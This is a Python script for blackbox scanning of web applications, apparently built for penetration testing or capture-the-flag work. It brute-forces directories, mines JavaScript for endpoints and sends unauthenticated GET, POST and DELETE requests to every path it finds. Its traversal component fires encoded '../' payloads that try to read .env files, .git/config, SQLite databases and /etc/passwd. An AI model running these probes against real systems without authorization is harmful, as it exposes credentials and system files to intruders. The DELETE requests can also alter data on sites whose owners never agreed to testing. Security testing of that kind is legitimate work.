#!/usr/bin/env python3
"""Blackbox web surface enumeration battery.

Four components, one JSON report:
  1. wordlist discovery (dirb common.txt by default)
  2. static-prefix alias traversal probes (nginx `location /assets + alias` class)
  3. JS endpoint extraction (fetch/axios literals in same-origin scripts)
  4. unauthenticated method matrix (auth boundary snapshot)

Dependency-free (urllib). All probes are same-target GET/HEAD/POST only.
"""
import argparse
import concurrent.futures
import json
import re
import urllib.error
import urllib.parse
import urllib.request

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")

WORDLISTS = [
    "/usr/share/wordlists/dirb/common.txt",
    "/usr/share/wordlists/dirb/big.txt",
]

TRAVERSAL_FILES = [
    ".env", "server.php", ".git/config", ".git/HEAD", "app.py", "main.py",
    "backup.tar.gz", "db.sqlite3", "database.sqlite", "config.json",
    "composer.json", "package.json", "web.config", "robots.txt",
]

TRAVERSAL_PATTERNS = [
    "{pre}../{f}", "{pre}%2e%2e/{f}", "{pre}..%2f{f}", "{pre}%2e./{f}",
    "{pre}..%252f{f}", "{pre}%2e%2e%2f{f}",
]


def fetch(url, method="GET", timeout=5, body=None, headers=None):
    hdrs = {"User-Agent": UA}
    if headers:
        hdrs.update(headers)
    data = body.encode() if isinstance(body, str) else body
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout, ) as r:
            return r.status, dict(r.headers), r.read(20000)
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read(20000)
    except Exception as e:
        return None, {}, repr(e).encode()


def load_wordlist(extra=None, max_words=None):
    words = []
    import os
    for path in WORDLISTS:
        if os.path.exists(path):
            with open(path, encoding="utf-8", errors="replace") as fh:
                words = [w.strip() for w in fh if w.strip() and not w.startswith("#")]
            break
    if not words:
        words = ["admin", "api", "login", "register", "stats", "flag", "debug",
                 "storage", "assets", "static", "uploads", "backup", "configs",
                 "health", "report", "user", "users", ".env", "server-status"]
    if extra:
        words.extend(extra)
    seen = set()
    out = []
    for w in words:
        if w not in seen:
            seen.add(w)
            out.append(w)
    return out[:max_words] if max_words else out


def enum_paths(base, words, workers=16, timeout=5):
    def hit(w):
        url = base.rstrip("/") + "/" + w.lstrip("/")
        st, _, _ = fetch(url, timeout=timeout)
        return (w, st) if st not in (None, 404) else None
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        return [r for r in ex.map(hit, words) if r]


def static_prefixes_from_html(html):
    """Guess static-ish prefixes from src=/href= attributes."""
    prefs = set()
    for m in re.finditer(r'(?:src|href)=["\'](/[^"\']*)["\']', html):
        parts = [p for p in m.group(1).split("/") if p]
        if len(parts) >= 1 and not parts[0].startswith(("http", "mailto")):
            prefs.add("/" + parts[0])
    return sorted(p for p in prefs if len(p) > 1 and "." not in p)


def traversal_probes(base, prefixes, timeout=5):
    """nginx alias traversal class: /location../ escapes the alias root."""
    hits = []
    probes = []
    for pre in prefixes:
        for f in TRAVERSAL_FILES:
            for pat in TRAVERSAL_PATTERNS:
                probes.append("/" + pat.format(pre=pre.strip("/") + "/", f=f))
    probes.append("/..%2f" + "etc/passwd")
    probes.append("/..%252fetc/passwd")

    def hit(p):
        st, _, body = fetch(base.rstrip("/") + p, timeout=timeout)
        if st == 200 and len(body) > 40:
            return {"path": p, "status": st, "len": len(body),
                    "snippet": body[:120].decode("utf-8", "replace")}
        return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
        hits = [r for r in ex.map(hit, probes) if r]
    return hits


def extract_js_endpoints(base, timeout=5):
    """Fetch same-origin scripts referenced by /, return path-like literals."""
    st, _, home = fetch(base.rstrip("/") + "/", timeout=timeout)
    scripts = []
    if home:
        for m in re.finditer(r'src=["\'](/[^"\']+\.js[^"\']*)["\']', home.decode("utf-8", "replace")):
            scripts.append(m.group(1))
    paths = set()
    for s in scripts:
        _, _, js = fetch(base.rstrip("/") + s, timeout=timeout)
        if not js:
            continue
        text = js.decode("utf-8", "replace")
        # path literal preceded by a quote (incl. backticks); do NOT require a
        # closing quote so template literals with ?query/${...} still match
        for m in re.finditer(r"""(?<=['"`])(/[A-Za-z0-9_@%\-./]+)""", text):
            p = m.group(1)
            if len(p) > 1 and not p.startswith("//") and not p.endswith(".css"):
                paths.add(p.split("?")[0])
    return sorted(paths)


def method_matrix(base, paths, timeout=5):
    rows = []
    for p in paths:
        row = {"path": p}
        for m in ("GET", "POST", "DELETE"):
            st, _, body = fetch(base.rstrip("/") + p, method=m, timeout=timeout)
            row[m] = st
        # auth-boundary signal: reachable but blocked on other methods
        if 200 in (row["GET"], row["POST"]) and (401 in row.values() or 403 in row.values() or 405 in row.values()):
            row["signal"] = "mixed-auth/methods"
        rows.append(row)
    return rows


def run(base, workers=16, max_words=None, timeout=5):
    report = {"base": base}
    words = load_wordlist(max_words=max_words)
    found = enum_paths(base, words, workers=workers, timeout=timeout)
    report["paths"] = [{"path": "/" + w, "status": st} for w, st in found]
    st, _, home = fetch(base.rstrip("/") + "/", timeout=timeout)
    prefixes = static_prefixes_from_html(home.decode("utf-8", "replace")) if home else []
    report["static_prefixes"] = prefixes
    report["traversal"] = traversal_probes(base, prefixes, timeout=timeout)
    js_paths = extract_js_endpoints(base, timeout=timeout)
    known = {p["path"] for p in report["paths"]} | set(js_paths)
    report["js_endpoints"] = js_paths
    matrix_paths = sorted(known | {p["path"] for p in report["paths"]})
    report["method_matrix"] = method_matrix(base, matrix_paths, timeout=timeout)
    return report


def main():
    ap = argparse.ArgumentParser(description="Blackbox web surface enumeration battery")
    ap.add_argument("base_url")
    ap.add_argument("--workers", type=int, default=16)
    ap.add_argument("--max-words", type=int, default=None)
    ap.add_argument("--timeout", type=float, default=5)
    ap.add_argument("--out", default=None)
    args = ap.parse_args()
    rep = run(args.base_url, workers=args.workers, max_words=args.max_words, timeout=args.timeout)
    text = json.dumps(rep, ensure_ascii=False, indent=1)
    if args.out:
        with open(args.out, "w", encoding="utf-8") as fh:
            fh.write(text)
    print(text)


if __name__ == "__main__":
    main()
